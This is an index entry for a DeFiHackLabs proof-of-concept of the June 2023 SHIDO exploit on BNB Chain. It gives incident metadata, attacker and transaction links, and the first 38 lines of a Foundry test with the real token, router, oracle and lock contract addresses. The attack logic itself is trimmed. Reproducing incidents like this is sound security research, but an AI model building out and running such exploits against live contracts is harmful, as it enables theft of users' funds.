# [?] SHIDO_exp2 exploit (2023-06)

## Summary
Severity: Unknown
Chain: BNB Chain
Component: SHIDO_exp2
Published: 2023-06
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp2.sol
Type: defi-exploit-poc

## Details
References:
- https://twitter.com/Phalcon_xyz/status/1672473343734480896

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~977 WBNB
// Attacker : https://bscscan.com/address/0x69810917928b80636178b1bb011c746efe61770d
// Attack Contract : https://bscscan.com/address/0xcdb3d057ca0cfdf630baf3f90e9045ddeb9ea4cc
// Attack Tx : https://bscscan.com/tx/0x72f8dd2bcfe2c9fbf0d933678170417802ac8a0d8995ff9a56bfbabe3aa712d6

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1672473343734480896

interface IShidoLock {
    function lockTokens() external;

    function claimTokens() external;
}

contract ShidoTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 SHIDOInu = IERC20(0x733Af324146DCfe743515D8D77DC25140a07F9e0);
    // SHIDO Standard Token
    IERC20 SHIDO = IERC20(0xa963eE460Cf4b474c35ded8fFF91c4eC011FB640);
    IDPPOracle DPPAdvanced = IDPPOracle(0x81917eb96b397dFb1C6000d28A5bc08c0f05fC1d);
    Uni_Router_V2 PancakeRouter = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Router_V2 AddRemoveLiquidityForFeeOnTransferTokens = Uni_Router_V2(0x9869674E80D632F93c338bd398408273D20a6C8e);
    IShidoLock ShidoLock = IShidoLock(0xaF0CA21363219C8f3D8050E7B61Bb5f04e02F8D4);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 29_365_171);
        cheats.label(address(WBNB), "WBNB");
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/SHIDO_exp2.sol_
